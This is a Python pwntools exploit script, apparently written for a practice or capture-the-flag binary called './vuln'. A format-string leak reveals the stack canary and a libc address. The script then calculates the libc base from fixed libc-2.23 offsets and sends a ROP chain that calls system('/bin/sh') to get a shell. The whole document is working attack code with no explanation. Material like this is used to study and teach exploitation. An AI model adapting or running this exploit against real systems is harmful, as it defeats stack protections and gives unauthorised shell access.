#!/usr/bin/env python
from pwn import *

_libc_start_main_offset = 0x0000000000020740

# GADGETS of /lib/x86-64/libc-2.23.so

POPRDI = 0x0000000000042c0d

# leak for getting stack canary and __libc_start_main
leak = "%17$p,%19$p"

# padding
padding = "A"*72

# pause for attaching with gdb for debugging purposes
# pause()

# start the process
p = process(["./vuln", leak])

# First address is the cookie
cookie = p.recvuntil(",")

# And the other the libc funtion address
_libc_start_main_address = p.recv()

# Print the cookie
log.info("Cookie: "+ cookie[:len(cookie)-1])

# We parse the cookie
cookie = cookie[2:len(cookie)-1].decode("hex")[::-1]

# We parse the libc function address
_libc_start_main_address = u64(("0000" + _libc_start_main_address[2:len(_libc_start_main_address)-1]).decode("hex")[::-1])-240

# We print and calculate the libc base address
log.info("libc base address: "+hex(_libc_start_main_address-_libc_start_main_offset))
libc_base = _libc_start_main_address-_libc_start_main_offset
system = 0x0000000000045390 + libc_base

POPRDI += libc_base
binsh = libc_base + 0x18cd17

log.info("binsh is at: "+hex(binsh))

# Making the payload
payload = ""
payload += padding
payload += cookie
payload += "AAAAAAAA"
payload += p64(POPRDI)
payload += p64(binsh)
payload += p64(system)
# Sending the exploit
p.sendline(payload+"\n")

# Spawning shell
p.interactive()